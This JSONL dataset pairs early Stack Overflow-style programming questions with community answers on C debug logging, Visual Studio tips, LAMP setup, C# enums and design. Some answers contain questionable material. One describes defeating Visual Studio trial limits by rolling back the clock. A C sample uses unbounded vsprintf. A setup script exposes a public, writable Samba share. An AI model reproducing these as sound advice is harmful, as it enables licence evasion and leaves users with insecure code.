{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "I still do it the old way, by defining a macro (XTRACE, below) which correlates to either a no-op or a function call with a variable argument list. Internally, call vsnprintf so you can keep the printf syntax:\n#include <stdio.h>\n\nvoid XTrace0(LPCTSTR lpszText)\n{\n   ::OutputDebugString(lpszText);\n}\n\nvoid XTrace(LPCTSTR lpszFormat, ...)\n{\n    va_list args;\n    va_start(args, lpszFormat);\n    int nBuf;\n    TCHAR szBuffer[512]; // get rid of this hard-coded buffer\n    nBuf = _vsnprintf(szBuffer, 511, lpszFormat, args);\n    ::OutputDebugString(szBuffer);\n    va_end(args);\n}\n\nThen a typical #ifdef switch:\n#ifdef _DEBUG\n#define XTRACE XTrace\n#else\n#define XTRACE\n#endif\n\nWell that can be cleaned up quite a bit but it's the basic idea."}
{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "Ah, vsprintf() was the thing I was missing.  I can use this to pass the variable argument list directly to printf():\n#include <stdarg.h>\n#include <stdio.h>\n\nvoid DBG_PrintImpl(char * format, ...)\n{\n    char buffer[256];\n    va_list args;\n    va_start(args, format);\n    vsprintf(buffer, format, args);\n    printf(\"%s\", buffer);\n    va_end(args);\n}\n\nThen wrap the whole thing in a macro."}
{"instruction": "In the Visual Studio toolbar, you can enter commands into the search box by prefixing them with a > symbol. Is there any way to disable this? I've never used the feature, and it's slightly annoying when trying to actually search for something that you know is prefixed by greater-than in the code. It's particularly annoying when you accidentally search for \"> exit\" and the IDE quits (I knew there was a line in the code that was something like if(counter > exitCount) so entered that search without thinking).\nAt the very least, can you escape the > symbol so that you can search for it? Prefixing with ^ doesn't seem to work.", "output": "you can enter commands into the search box by prefixing them with a > symbol. \n\nWow, I didn't know that. Where do I find the list of possible commands?\nI never actually use the search box, I've remapped ctrl+F to incremental search, which is usually ctrl+I\nI find this much cooler than the normal search - give it a go, you might end up not caring about the search box anymore."}
{"instruction": "In the Visual Studio toolbar, you can enter commands into the search box by prefixing them with a > symbol. Is there any way to disable this? I've never used the feature, and it's slightly annoying when trying to actually search for something that you know is prefixed by greater-than in the code. It's particularly annoying when you accidentally search for \"> exit\" and the IDE quits (I knew there was a line in the code that was something like if(counter > exitCount) so entered that search without thinking).\nAt the very least, can you escape the > symbol so that you can search for it? Prefixing with ^ doesn't seem to work.", "output": "Wow, I didn't know that. Where do I\n  find the list of possible commands?\n\nThe commands are the same as those you can enter in the command window, so you can pretty much drive the entire IDE and debugger using it. There are a load of predefined aliases for common commands. Open up the command window and enter alias for a list, to get you started."}
{"instruction": "In the Visual Studio toolbar, you can enter commands into the search box by prefixing them with a > symbol. Is there any way to disable this? I've never used the feature, and it's slightly annoying when trying to actually search for something that you know is prefixed by greater-than in the code. It's particularly annoying when you accidentally search for \"> exit\" and the IDE quits (I knew there was a line in the code that was something like if(counter > exitCount) so entered that search without thinking).\nAt the very least, can you escape the > symbol so that you can search for it? Prefixing with ^ doesn't seem to work.", "output": "This is a really cool feature. I've poked through the feature documentation, and the accompanying command list, and not a heck of a lot is showing up in terms of turning it off.\nIf you want to search for >exit, you could always type >Edit.Find >exit in the search box; that seems to do the trick. A bit verbose, though, but it really is an edge case."}
{"instruction": "What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.\nOur JavaScript code is roughly \"namespaced\" as:\nvar Client = {\n   var1: '',\n   var2: '',\n\n   accounts: {\n      /* 100's of functions and variables */\n   },\n\n   orders: {\n      /* 100's of functions and variables and subsections */\n   }\n\n   /* etc, etc  for a couple hundred kb */\n}\n\nAt the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes forever to find anything in the JavaScript code and the browser still has a dozen files to download.\nIs it common to have a handful of \"source\" JavaScript files that gets \"compiled\" into one final, compressed JavaScript file? Any other handy hints or best practices?", "output": "The approach that I've found works for me is having seperate JS files for each class (just as you would in Java, C# and others). Alternatively you can group your JS into application functional areas if that's easier for you to navigate.\nIf you put all your JS files into one directory, you can have your server-side environment (PHP for instance) loop through each file in that directory and output a <script src='/path/to/js/$file.js' type='text/javascript'> in some header file that is included by all your UI pages. You'll find this auto-loading especially handy if you're regularly creating and removing JS files.\nWhen deploying to production, you should have a script that combines them all into one JS file and \"minifies\" it to keep the size down."}
{"instruction": "What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.\nOur JavaScript code is roughly \"namespaced\" as:\nvar Client = {\n   var1: '',\n   var2: '',\n\n   accounts: {\n      /* 100's of functions and variables */\n   },\n\n   orders: {\n      /* 100's of functions and variables and subsections */\n   }\n\n   /* etc, etc  for a couple hundred kb */\n}\n\nAt the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes forever to find anything in the JavaScript code and the browser still has a dozen files to download.\nIs it common to have a handful of \"source\" JavaScript files that gets \"compiled\" into one final, compressed JavaScript file? Any other handy hints or best practices?", "output": "For server efficiency's sake, it is best to combine all of your javascript into one minified file.\nDetermine the order in which code is required and then place the minified code in the order it is required in a single file.\nThe key is to reduce the number of requests required to load your page, which is why you should have all javascript in a single file for production.\nI'd recommend keeping files split up for development and then create a build script to combine/compile everything.\nAlso, as a good rule of thumb, make sure you include your JavaScript toward the end of your page. If JavaScript is included in the header (or anywhere early in the page), it will stop all other requests from being made until it is loaded, even if pipelining is turned on. If it is at the end of the page, you won't have this problem."}
{"instruction": "What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.\nOur JavaScript code is roughly \"namespaced\" as:\nvar Client = {\n   var1: '',\n   var2: '',\n\n   accounts: {\n      /* 100's of functions and variables */\n   },\n\n   orders: {\n      /* 100's of functions and variables and subsections */\n   }\n\n   /* etc, etc  for a couple hundred kb */\n}\n\nAt the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes forever to find anything in the JavaScript code and the browser still has a dozen files to download.\nIs it common to have a handful of \"source\" JavaScript files that gets \"compiled\" into one final, compressed JavaScript file? Any other handy hints or best practices?", "output": "Just a sidenode - Steve already pointed out, you should really \"minify\" your JS files. In JS, whitespaces actually matter. If you have thousand lines of JS and you strip only the unrequired newlines you have already saved about 1K. I think you get the point.\nThere are tools, for this job. And you should never modify the \"minified\"/stripped/obfuscated JS by hand! Never!"}
{"instruction": "I know this site is written using ASP.Net MVC and I do not see \"/Home\" in the url.  This proves to me that it can be done.  What special route and do I need?", "output": "Just change \"Home\" to an empty string.\nroutes.MapRoute(\n    \"Home\",\n    \"\",\n    new { action = Index, controller = Home }\n);"}
{"instruction": "Hy, does anyone worked with N2 Content Management System(http://www.codeplex.com/n2).\nIf yes, how does it perform, performance wise(under heavy load)?\nIt seems pretty simple and easy to use.\nAdrian", "output": "Maybe try this question at http://www.codeplex.com/n2/Thread/List.aspx\nThey might be able to tell you about performance limitations or bottlenecks."}
{"instruction": "I am using xampp on Windows, but I would like to use something closer to my server setup.\nFederico Cargnelutti tutorial explains how to setup LAMP VMWARE appliance; it is a great introduction to VMware appliances, but one of the commands was not working and it doesn't describe how to change the keyboard layout and the timezone.\nps: the commands are easy to find but I don't want to look for them each time I reinstall the server. I am using this question as a reminder.", "output": "This is my install scrpt, I use it on debian servers, but it will work in Ubuntu (Ubuntu is built on Debian)\napt-get -yq update\napt-get -yq upgrade\napt-get -yq install sudo\napt-get -yq install gcc\napt-get -yq install g++\napt-get -yq install make\napt-get -yq install apache2\napt-get -yq install php5\napt-get -yq install php5-curl\napt-get -yq install php5-mysql\napt-get -yq install php5-gd\napt-get -yq install mysql-common\napt-get -yq install mysql-client\napt-get -yq install mysql-server\napt-get -yq install phpmyadmin\napt-get -yq install samba\necho '[global]\n   workgroup = workgroup\n   server string = %h server\n   dns proxy = no\n   log file = /var/log/samba/log.%m\n   max log size = 1000\n   syslog = 0\n   panic action = /usr/share/samba/panic-action %d\n   encrypt passwords = true\n   passdb backend = tdbsam\n   obey pam restrictions = yes\n   ;invalid users = root\n   unix password sync = no\n   passwd program = /usr/bin/passwd %u\n   passwd chat = *Enter\\snew\\sUNIX\\spassword:* %n\\n *Retype\\snew\\sUNIX\\spassword:* %n\\n *password\\supdated\\ssuccessfully* .\n   socket options = TCP_NODELAY\n[homes]\n   comment = Home Directories\n   browseable = no\n   writable = no\n   create mask = 0700\n   directory mask = 0700\n   valid users = %S\n[www]\n   comment = WWW\n   writable = yes\n   locking = no\n   path = /var/www\n   public = yes' > /etc/samba/smb.conf\n(echo SAMBAPASSWORD; echo SAMBAPASSWORD) | smbpasswd -sa root\necho 'NameVirtualHost *\n<VirtualHost *>\n        ServerAdmin webmaster@localhost\n        DocumentRoot /var/www/\n        <Directory />\n                Options FollowSymLinks\n                AllowOverride None\n        </Directory>\n        <Directory /var/www/>\n                Options Indexes FollowSymLinks MultiViews\n                AllowOverride None\n                Order allow,deny\n                allow from all\n        </Directory>\n        ErrorLog /var/log/apache2/error.log\n        LogLevel warn\n        CustomLog /var/log/apache2/access.log combined\n        ServerSignature On\n</VirtualHost>' > /etc/apache2/sites-enabled/000-default\n/etc/init.d/apache2 stop\n/etc/init.d/samba stop\n/etc/init.d/apache2 start\n/etc/init.d/samba start\n\nedit: add this to set your MySQL password\n/etc/init.d/mysql stop\necho \"UPDATE mysql.user SET Password=PASSWORD('MySQLPasswrod') WHERE User='root'; FLUSH PRIVILEGES;\" > /root/MySQLPassword\nmysqld_safe --init-file=/root/MySQLPassword &\nsleep 1\n/etc/init.d/mysql stop\nsleep 1\n/etc/init.d/mysql start\n\nend edit\nThis is a bit specailised but you get the idea, if you save this to a file ('install' for example) all you have to do is:\nchmod +x install\n./install\n\nSome of my apt-get commands are not necessary, because apt will automatically get the dependencies but I prefer to be specific, for my installs."}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "Before you start coding, plan out your database schema - everything else will flow from that. Getting the database reasonably correct early on will save you time and headaches later."}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "Do you know much about OOP?  If so, look into Spring and Hibernate to keep your implementation clean and orthogonal.  If you get that, you should find TDD a good way to keep your design compact and lean, especially since you have \"automated testing\" up and running.\nUPDATE:\nLooking at the first slew of answers, I couldn't disagree more.  Particularly in the Java space, you should find plenty of mentors/resources on working out your application with Objects, not a database-centric approach.  Database design is typically the first step for Microsoft folks (which I do daily, but am in a recovery program, er, Alt.Net).  If you keep the focus on what you need to deliver to a customer and let your ORM figure out how to persist your objects, your design should be better."}
{"instruction": "I'm looking for a way to configure a DB connection at runtime; specifically using the Enterprise Library.  I see that there's a *.Data.Configuration (or something close to this ... don't recall off the top of my head) assembly but am finding not much on the interwebs.  Complicating matters is the fact that the API help is broken on Vista.\nNow, I found this work-around:\nConfiguration cfg = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);\nConnectionStringSettings connection = new ConnectionStringSettings();\nconnection.Name = \"Runtime Connection\";\nconnection.ProviderName = \"System.Data.OleDb\";\nconnection.ConnectionString = \"myconstring\";\ncfg.ConnectionStrings.ConnectionStrings.Add(connection);\ncfg.Save(ConfigurationSaveMode.Modified);\n\nConfigurationManager.RefreshSection(\"connectionStrings\");\nvar runtimeCon = DatabaseFactory.CreateDatabase(\"Runtime Connection\");\n\nAnd although it gives me what I want, it permanently edits the App.config. Sure I can go back and delete the changes, but I'd rather not go through this hassle.", "output": "If you're using a winforms app you could try using UserProperties to store this info. Another possible solution could be custom configuration sections."}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "I do it the other way around. I find that doing it database-schema-first gets the system stuck in a data-driven-design that is difficult to abstract from persistence. We try to do domain model designs first and then base the database schema on those.\nAnd then there's the infrastructure design: the team should settle on conventions on how to structure the program first and foremost. And then we work together to agree first on a design for the common functionality of the system (e.g., things everyone needs like persistence, logging, etc.). This becomes the framework of the system.\nWe all work on that together first before we split the rest of the functionalities amongst ourselves."}
{"instruction": "I'm looking for a way to configure a DB connection at runtime; specifically using the Enterprise Library.  I see that there's a *.Data.Configuration (or something close to this ... don't recall off the top of my head) assembly but am finding not much on the interwebs.  Complicating matters is the fact that the API help is broken on Vista.\nNow, I found this work-around:\nConfiguration cfg = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);\nConnectionStringSettings connection = new ConnectionStringSettings();\nconnection.Name = \"Runtime Connection\";\nconnection.ProviderName = \"System.Data.OleDb\";\nconnection.ConnectionString = \"myconstring\";\ncfg.ConnectionStrings.ConnectionStrings.Add(connection);\ncfg.Save(ConfigurationSaveMode.Modified);\n\nConfigurationManager.RefreshSection(\"connectionStrings\");\nvar runtimeCon = DatabaseFactory.CreateDatabase(\"Runtime Connection\");\n\nAnd although it gives me what I want, it permanently edits the App.config. Sure I can go back and delete the changes, but I'd rather not go through this hassle.", "output": "If you don't want it saved, you do not need to execute the cfg.Save command. \nThe Configuration object will store your changes until it isn't needed anymore."}
{"instruction": "Visual Studio is such a massively big product that even after years of working with it I sometimes stumble upon a new/better way to do things or things I didn't even know were possible.\nFor instance-\n\nCrtl + R, Ctrl + W to show white spaces. Essential for editing Python build scripts.\nUnder \"HKEY_CURRENT_USER\\Software\\Microsoft\\VisualStudio\\8.0\\Text Editor\" \nCreate a String called Guides with the value \"RGB(255,0,0), 80\" to have a red line at column 80 in the text editor.\n\nWhat other hidden features have you stumbled upon?", "output": "The most important feature I can't live without is Visual Studio 2008. :P"}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "The main thing is being able to abstract the complexity of the system so that you don't get bogged down by it as soon as you start off.\n\nFirst read the spec like a story (skimming through it). Don't stop at every requirement to analyze it right there and then. This will allow you to get an overall picture of the system without too many details. At this point you would start identifying the major functional components of the system. Start putting these down (use a mindmap tool if you like).\nThen take each component and start exploding it (and tying each detail with requirements in the spec document). Do this for all components, till you have covered all requirements.\nNow, you should start looking at relationships between the components, and whether there are repetitions of features or functions across the various components (which you can then pull out to create utility components, or such). Around now, you would have a good detailed map of your requirements in your mind.\nNOW, you should think of designing the database, ER diagrams, Class Design, DFDs, deployment, etc.\n\nThe problem with doing the last step first is that you can get bogged down in the complexity of your system without really gaining an overall understanding in the first place."}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "I also disagree about starting with the database.  The DB is simply an artifact of how your business objects are persisted.  I don't know of an equivalent in Java, but .Net has stellar tools such as SubSonic that allow your DB design to stay fluid as you iterate through your business objects design.  I'd say first and foremost (even before deciding on what technologies to introduce) focus on the process and identify your nouns and verbs ... then build out from those abstractions.  Hey, it really does work in the \"real world\", just like OOP 101 taught you!"}
{"instruction": "Visual Studio is such a massively big product that even after years of working with it I sometimes stumble upon a new/better way to do things or things I didn't even know were possible.\nFor instance-\n\nCrtl + R, Ctrl + W to show white spaces. Essential for editing Python build scripts.\nUnder \"HKEY_CURRENT_USER\\Software\\Microsoft\\VisualStudio\\8.0\\Text Editor\" \nCreate a String called Guides with the value \"RGB(255,0,0), 80\" to have a red line at column 80 in the text editor.\n\nWhat other hidden features have you stumbled upon?", "output": "The Debugger :-) Beats Notepad by miles."}
{"instruction": "Visual Studio is such a massively big product that even after years of working with it I sometimes stumble upon a new/better way to do things or things I didn't even know were possible.\nFor instance-\n\nCrtl + R, Ctrl + W to show white spaces. Essential for editing Python build scripts.\nUnder \"HKEY_CURRENT_USER\\Software\\Microsoft\\VisualStudio\\8.0\\Text Editor\" \nCreate a String called Guides with the value \"RGB(255,0,0), 80\" to have a red line at column 80 in the text editor.\n\nWhat other hidden features have you stumbled upon?", "output": "A lot of people don't know or use the debugger to it's fullest - I.E. just use it to stop code, but right click on the red circle and there are a lot more options such as break on condition, run code on break.\nAlso you can change variable values at runtime using the debugger which is a great feature - saves rerunning code to fix a silly logic error etc."}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "To practice without the need to write wrap code just to execute linq-queries you could use\nlinqpad.net"}
{"instruction": "I need to read from Outlook .MSG file in .NET without using COM API for Outlook (cos it will not be installed on the machines that my app will run). Are there any free 3rd party libraries to do that? I want to extract From, To, CC and BCC fields. Sent/Receive date fields would be good if they are also stored in MSG files.", "output": "If you open the .MSG file in a text editor, i believe you will find that the information you are after is stored as plain text inside the file. (It is on all the messages i have checked at least)\nIt would be pretty easy to write some code to parse the file looking for lines beginning with \"From:\" or \"To:\" etc. and then extracting the information you need.\nIf you need the body of the email as well, that may be a bit more complicated."}
{"instruction": "Visual Studio is such a massively big product that even after years of working with it I sometimes stumble upon a new/better way to do things or things I didn't even know were possible.\nFor instance-\n\nCrtl + R, Ctrl + W to show white spaces. Essential for editing Python build scripts.\nUnder \"HKEY_CURRENT_USER\\Software\\Microsoft\\VisualStudio\\8.0\\Text Editor\" \nCreate a String called Guides with the value \"RGB(255,0,0), 80\" to have a red line at column 80 in the text editor.\n\nWhat other hidden features have you stumbled upon?", "output": "Sara Ford has this market cornered.\nhttp://blogs.msdn.com/saraford/default.aspx\nMore Visual Studio tips and tricks than you can shake a stick at.\nSome others:\n\nThe Visual Studio 2005 and 2008 3-month trial editions are fully-functional, and can be used indefinitely (forever) by setting the system clock back prior to opening VS. Then, when VS is opened, set the system clock forward again so your datetimes aren't screwed up.\nBut that's really piracy and I can't recommend it, especially when anybody with a .edu address can get a fully-functional Pro version of VS2008 through Microsoft Dreamspark.\nYou can use Visual Studio to open 3rd-party executables, and browse embedded resources (dialogs, string tables, images, etc) stored within.\nDebugging visualizers are not exactly a \"hidden\" feature but they are somewhat neglected, and super-useful, since in addition to using the provided visualizers you can roll your own for specific data sets.\nDebugger's \"Set Instruction Pointer\" or \"Set Next Statement\" command.\nConditional breakpoints (as KiwiBastard noted).\nYou can use Quickwatch etc. to evaluate not only the value of a variable, but runtime expressions around that variable."}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "This sounds very much like my first job. Straight out of university, I was asked to design the database and business logic layer, while other people would take care of the UI. Meanwhile the boss was looking over my shoulder, unwilling to let go of what used to be his baby and was now mine, and poking his finger in it. Three years later, developers were fleeing the company and we were still X months away from actually selling anything.\nThe big mistake was in being too ambitious. If this is your first job, you will make mistakes and you will need to change how things work long after you've written them. We had all sorts of features that made the system more complicated than it needed to be, both on the database level and in the API that it presented to other developers. In the end, the whole thing was just far too complicated to support all at once and just died.\nSo my advice:\n\nIf you're not sure about taking on such a big job single-handed, don't. Tell your employers, and get them to find or hire somebody for you to work with who can help you out. If people need to be added to the project, then it should be done near the start rather than after stuff starts going wrong.\nThink very carefully about what the product is for, and to boil it down to the simplest set of requirements you can think of. If the people giving you the spec aren't technical, try to see past what they've written to what will actually work and make money. Talk to customers and salespeople, and understand the market.\nThere's no shame in admitting you're wrong. If it turns out that the entire system needs to be rewritten, because you made some mistake in your first version, then it's better to admit this as soon as possible so you can get to it. Correspondingly, don't try to make an architecture that can anticipate every possible contingency in your first version, because you don't know what every contingency is and will just get it wrong. Write once with an eye to throwing away and starting again - you may not have to, the first version may be fine, but admit it if you do."}
{"instruction": "Visual Studio is such a massively big product that even after years of working with it I sometimes stumble upon a new/better way to do things or things I didn't even know were possible.\nFor instance-\n\nCrtl + R, Ctrl + W to show white spaces. Essential for editing Python build scripts.\nUnder \"HKEY_CURRENT_USER\\Software\\Microsoft\\VisualStudio\\8.0\\Text Editor\" \nCreate a String called Guides with the value \"RGB(255,0,0), 80\" to have a red line at column 80 in the text editor.\n\nWhat other hidden features have you stumbled upon?", "output": "The memory windows, very useful if you're doing low level stuff.\nControl + K , Control + F - Format selection - great for quickly making code neat\nRegions, some love them, some hate them, most don't even know they exist\nChanging variables in debug windows during execution\nTracepoints\nConditional break points\nHold down Alt and drag for 'rectangular' selection.\nControl+B for a breakpoint, to break at function\nControl+I for incremental search, F3 to iterate"}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "Split the big system to smaller pieces.\nAnd don't think that it's so complex, because it usually isn't. By thinking too complex it just ruins your thoughts and eventually the design. Some point you just realize that you could do the same thing easier, and then you redesign it.\nAtleast this has been my major mistake in designing.\nKeep it simple!"}
{"instruction": "It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.\nI'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?\nA few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.", "output": "It has been my experience that Java applications (.NET also) that consider the database last are highly likely to perform poorly when placed into a corporate environment.  You need to really think about your audience.  You didn't say if it was a web app or not.  Either way the infrastructure that you are implementing on is important when considering how you handle your data.\nNo matter what methodology you consider, how you get and save your data and it's impact on performance should be right up there as one of your #1 priorities."}
{"instruction": "What's the best way/tool to display nice diagrams with entity relationships in ASP MVC views?  \ni.e. servers and and applications, or servers with other servers.\nAre there any third party tools out there that can do this?  \nI've been searching around things like Telerik, but it's really hard to google for this!", "output": "Here are some 3rd-party diagramming tools:\n\nhttp://www.nevron.com/Products.DiagramFor.NET.Overview.aspx\nhttp://www.nwoods.com/GO/dotnet.htm\nhttp://www.syncfusion.com/products/diagram/web/default.aspx"}
{"instruction": "What's the best way to convert a string to an enumeration value in C#?\nI have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.\nIn an ideal world, I could do something like this:\nStatusEnum MyStatus = StatusEnum.Parse(\"Active\");\n\nbut that isn't valid code.", "output": "You're looking for Enum.Parse.\nSomeEnum enum = (SomeEnum)Enum.Parse(typeof(SomeEnum), \"EnumValue\");"}
{"instruction": "What's the best way to convert a string to an enumeration value in C#?\nI have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.\nIn an ideal world, I could do something like this:\nStatusEnum MyStatus = StatusEnum.Parse(\"Active\");\n\nbut that isn't valid code.", "output": "It's rather ugly:\nStatusEnum MyStatus = (StatusEnum) Enum.Parse(typeof(StatusEnum), \"Active\", true);\n\nI tend to simplify this with:\npublic static T ParseEnum<T>(string value)\n{\n    return (T) Enum.Parse(typeof(T), value, true);\n}\n\nThen I can do:\nStatusEnum MyStatus = EnumUtil.ParseEnum<StatusEnum>(\"Active\");\n\nOne option suggested in the comments is to add an extension, which is simple enough:\npublic static T ToEnum<T>(this string value)\n{\n    return (T) Enum.Parse(typeof(T), value, true);\n}\n\nStatusEnum MyStatus = \"Active\".ToEnum<StatusEnum>();\n\nFinally, you may want to have a default enum to use if the string cannot be parsed:\npublic static T ToEnum<T>(this string value, T defaultValue) \n{\n    if (string.IsNullOrEmpty(value))\n    {\n        return defaultValue;\n    }\n\n    T result;\n    return Enum.TryParse<T>(value, true, out result) ? result : defaultValue;\n}\n\nWhich makes this the call:\nStatusEnum MyStatus = \"Active\".ToEnum(StatusEnum.None);\n\nHowever, I would be careful adding an extension method like this to string as (without namespace control) it will appear on all instances of string whether they hold an enum or not (so 1234.ToString().ToEnum(StatusEnum.None) would be valid but nonsensical) . It's often be best to avoid cluttering Microsoft's core classes with extra methods that only apply in very specific contexts unless your entire development team has a very good understanding of what those extensions do."}
{"instruction": "What's the best way to convert a string to an enumeration value in C#?\nI have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.\nIn an ideal world, I could do something like this:\nStatusEnum MyStatus = StatusEnum.Parse(\"Active\");\n\nbut that isn't valid code.", "output": "Enum.Parse is your friend:\nStatusEnum MyStatus = (StatusEnum)Enum.Parse(typeof(StatusEnum), \"Active\");"}
{"instruction": "What's the best way to convert a string to an enumeration value in C#?\nI have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.\nIn an ideal world, I could do something like this:\nStatusEnum MyStatus = StatusEnum.Parse(\"Active\");\n\nbut that isn't valid code.", "output": "object Enum.Parse(System.Type enumType, string value, bool ignoreCase);\n\nSo if you had an enum named mood it would look like this:\n   enum Mood\n   {\n      Angry,\n      Happy,\n      Sad\n   } \n\n   // ...\n   Mood m = (Mood) Enum.Parse(typeof(Mood), \"Happy\", true);\n   Console.WriteLine(\"My mood is: {0}\", m.ToString());"}
{"instruction": "I have a user that want to be able to select a textbox and have the current text selected so that he doesn't have to highlight it all in order to change the contents.  \nThe contents need to be handle when enter is pushed.  That part I think I have figured out but any suggestions would be welcome. \nThe part I need help with is that once enter has been pushed, any entry into the textbox should clear the contents again.\nEdit: The textbox controls an piece of RF hardware.  What the user wants to be able to do is enter a setting and press enter.  The setting is sent to the hardware.  Without doing anything else the user wants to be able to type in a new setting and press enter again.", "output": "OK, are you sure that is wise? I am picturing two scenarios here:\n\nThere is a default button on the form, which is \"clicked\" when enter is pushed\".\nThere is no default button, and you want the user to have to press enter, regardless.\n\nBoth of these raise the same questions:\n\nIs there any validation that is taking place on the text?\nWhy not create a user control to encapsulate this logic?\nIf you know the enter button is being pushed and consumed fine, how are you having problems with TextBoxName.Text = string.Empty ?\n\nAlso, as a polite note, can you please try and break up your question a bit? One big block is a bit of a pain to read.."}
{"instruction": "(assume php5) consider\n<?php\n\n    $foo = 'some words';\n\n    //case 1\n    print \"these are $foo\";\n\n    //case 2\n    print \"these are {$foo}\";\n\n    //case 3\n    print 'these are ' . $foo;\n?>\n\nIs there much of a difference between 1 and 2?\nIf not, what about between 1/2 and 3?", "output": "Don't get too caught up on trying to optimize string operations in PHP. Concatenation vs. interpolation is meaningless (in real world performance) if your database queries are poorly written or you aren't using any kind of caching scheme. Write your string operations in such a way that debugging your code later will be easy, the performance differences are negligible.\n@uberfuzzy Assuming this is just a question about language minutia, I suppose it's fine. I'm just trying to add to the conversation that comparing performance between single-quote, double-quote and heredoc in real world applications in meaningless when compared to the real performance sinks, such as poor database queries."}
{"instruction": "I have a user that want to be able to select a textbox and have the current text selected so that he doesn't have to highlight it all in order to change the contents.  \nThe contents need to be handle when enter is pushed.  That part I think I have figured out but any suggestions would be welcome. \nThe part I need help with is that once enter has been pushed, any entry into the textbox should clear the contents again.\nEdit: The textbox controls an piece of RF hardware.  What the user wants to be able to do is enter a setting and press enter.  The setting is sent to the hardware.  Without doing anything else the user wants to be able to type in a new setting and press enter again.", "output": "Hook into the KeyPress event on the TextBox, and when it encounters the Enter key, run your hardware setting code, and then highlight the full text of the textbox again (see below) - Windows will take care of clearing the text with the next keystroke for you.\nTextBox1.Select(0, TextBox1.Text.Length);"}
{"instruction": "What's the best way to convert a string to an enumeration value in C#?\nI have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.\nIn an ideal world, I could do something like this:\nStatusEnum MyStatus = StatusEnum.Parse(\"Active\");\n\nbut that isn't valid code.", "output": "// str.ToEnum<EnumType>()\nT static ToEnum<T>(this string str) \n{ \n    return (T) Enum.Parse(typeof(T), str);\n}"}
